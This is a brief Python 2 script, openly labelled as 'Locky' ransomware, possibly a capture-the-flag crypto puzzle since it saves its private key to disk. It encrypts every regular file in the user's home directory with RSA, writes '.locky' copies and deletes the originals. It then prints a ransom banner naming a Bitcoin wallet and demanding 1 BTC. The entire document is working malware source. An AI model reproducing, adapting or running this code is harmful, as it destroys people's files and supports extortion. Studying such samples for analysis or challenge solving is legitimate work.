#!/usr/bin/python
# -*- coding: utf-8 -*-
# I was so locky :)

import glob
from os.path import expanduser, isfile
from os import remove
from Crypto.PublicKey import RSA
import time

nbit = 4096
privkey = RSA.generate(nbit, e = 65537)
privkey_PEM = privkey.exportKey()
pubkey  = privkey.publickey()
stamp = int(time.time())


home = expanduser("~")
files = glob.glob(home + '/*')
LC, i = [], 0
for f in files:
    if isfile(f):
        if not f.endswith('.locky'):
            fd = open(f, 'r')
            g = open(f + '.locky', 'w')
            round = stamp % 14
            msg = fd.read()
            for _ in xrange(round):
                msg = privkey.encrypt(msg, 0)[0]
            LC.append(msg)
            g.write(LC[i])
            g.close()
            fd.close()
            remove(f)
            i += 1   

pub = open(home + '/.locky_' + str(stamp), 'w')
pub.write(pubkey.exportKey())
pub.close()

troll = '''*                                                                           *
*                        ▒▒▒▄▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▄▄                         *
*                        ▒▒█▒░░░░▄▄▄▄▀░░░░░▒▀▀▄▄▄▒▒█                        *
*                        ▒█▒░░░░░▄▀▀▄▄░░░░▒▄▄▄▒▒▒▒▒▒█                       *
*                        █▒▀▄▄▒░░██▄▄▄█░░▒██▄▄█▒▒▒▒▒▒█                      *
*                        █▒▒░▄▀▄▄▄▀░░░░░░▒▒█▒▒▒▒▒▒▒▒█                       *
*                        █▒░░█▄▄░░░░░█▀░░░░▀▄▒▒▄▀▀▀▄█                       *
*                        █▒░░▀█▄█▀▀▄░▀▀▀▀▄▄▄▀▒▒▒█▒▒█                        *
*                        ▒█▒░░░▀█▄▄█▀▀▀█▀▀▀█▀█▀██▒▒█                        *
*                        ▒▒█▒░░░░▀██▄▄▄█▄▄▄█▄██▒▒▒▒█▄                       *
*                        ▒▒▒█▒░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒█                       *
*                        ▒▒▒▒▀▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀                       *
*                                                                           *'''

print '*' * 77
print '*' * 34 + ' WARNING ' + '*' * 34
print '*' * 77
print troll
print '*' * 77
print '*' * 14 + ' ALL OF YOUR FILES ENCRYPTED BY LOCKY RANSOMWARE ' + '*' * 14
print '*' * 14 + ' My wallet is 1Locky2M3foYCzARBjfu93q6CrDYxpKvQS ' + '*' * 14
raw_input('*' * 14 + ' Press enter to continue and pay 1 BTC to me ... ' + '*' * 14)

v = open('privkey.pem', 'w')
v.write(privkey_PEM)
v.close()
